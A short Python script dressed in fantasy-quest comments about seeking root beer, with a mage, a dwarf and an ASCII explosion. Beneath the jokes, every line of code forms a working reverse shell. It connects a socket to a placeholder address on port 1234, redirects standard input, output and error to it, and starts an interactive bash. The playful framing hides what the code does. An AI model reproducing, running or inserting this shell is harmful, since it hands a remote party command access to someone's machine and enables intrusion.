#  Hear ye, hear ye, all who seek the root beer.
#  I gift upon ye code that will aid you in your
#  journey!  Seek the hidden jewels and find the
#  root beer, before the ice cream melts!

#  For your quest, you will require assistance.

#  Mage: You have my psionics!
import socket

#  Dwarf: And have my swarms!
import subprocess

#  Bill: Uhh....Am I in the right place?  
#        Whatever...here you go!!!
import os

# Mage:  Behold as I form our psybridge!
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# Dwarf: The powwweeerrrrr.  I can feel ittt!!!!!!
s.connect(("255.255.255.255",1234))

# Mage: Release the SWARMS!

# Dwarf:  Slams axe on ground, causing earthquake.
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

#       *Nuclear explosion*
#          _ ._  _ , _ ._
#        (_ ' ( `  )_  .__)
#      ( (  (    )   `)  ) _)
#     (__ (_   (_ . _) _) ,__)
#         `~~`\ ' . /`~~`
#              ;   ;
#              /   \
#_____________/_ __ \_____________
p=subprocess.call(["/bin/bash","-i"]);
